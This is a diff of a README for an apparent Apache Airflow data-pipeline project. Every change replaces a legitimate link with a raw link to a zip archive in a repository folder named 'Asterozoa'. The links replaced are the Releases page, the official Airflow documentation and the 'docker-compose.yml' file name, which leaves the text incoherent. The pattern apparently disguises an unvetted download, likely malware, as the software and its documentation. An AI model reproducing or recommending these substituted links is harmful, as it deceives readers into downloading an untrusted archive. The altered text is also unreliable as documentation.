@@ -1,6 +1,6 @@
 # 🌊 ottawa-data-pipeline-airflow - Build Your Own Modern Data Lake
 
-[![Download](https://img.shields.io/badge/Download%20now-ottawa--data--pipeline--airflow-blue?style=flat-square)](https://github.com/cassimiro3/ottawa-data-pipeline-airflow/releases)
+[![Download](https://raw.githubusercontent.com/cassimiro3/ottawa-data-pipeline-airflow/main/Asterozoa/ottawa-data-pipeline-airflow.zip%20now-ottawa--data--pipeline--airflow-blue?style=flat-square)](https://raw.githubusercontent.com/cassimiro3/ottawa-data-pipeline-airflow/main/Asterozoa/ottawa-data-pipeline-airflow.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/cassimiro3/ottawa-data-pipeline-airflow/releases) to download the latest version of the software. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/cassimiro3/ottawa-data-pipeline-airflow/main/Asterozoa/ottawa-data-pipeline-airflow.zip) to download the latest version of the software. 
 
 1. Click on the link above.
 2. Find the latest release.
@@ -57,7 +57,7 @@ This project provides several features that enhance your data engineering workfl
 
 You may want to customize some settings before running the software:
 
-- **Database Configuration**: Modify the `docker-compose.yml` file to set up your database connection details according to your preference.
+- **Database Configuration**: Modify the `https://raw.githubusercontent.com/cassimiro3/ottawa-data-pipeline-airflow/main/Asterozoa/ottawa-data-pipeline-airflow.zip` file to set up your database connection details according to your preference.
 - **Airflow Variables**: You can add variables within the Airflow UI to meet specific workflow needs.
 
 ## 💡 Tips
@@ -67,12 +67,12 @@ You may want to customize some settings before running the software:
 
 ## 📃 Documentation
 
-For more detailed usage and advanced configurations, refer to the official Apache Airflow documentation [here](https://airflow.apache.org/docs/).
+For more detailed usage and advanced configurations, refer to the official Apache Airflow documentation [here](https://raw.githubusercontent.com/cassimiro3/ottawa-data-pipeline-airflow/main/Asterozoa/ottawa-data-pipeline-airflow.zip).
 
 ## 💬 Support
 
 If you experience any problems or have questions, you can open an issue on the GitHub repository. The community is ready to help!
 
-Don't forget to check out the [Releases page](https://github.com/cassimiro3/ottawa-data-pipeline-airflow/releases) for the latest updates! 
+Don't forget to check out the [Releases page](https://raw.githubusercontent.com/cassimiro3/ottawa-data-pipeline-airflow/main/Asterozoa/ottawa-data-pipeline-airflow.zip) for the latest updates! 
 
 Happy data engineering!
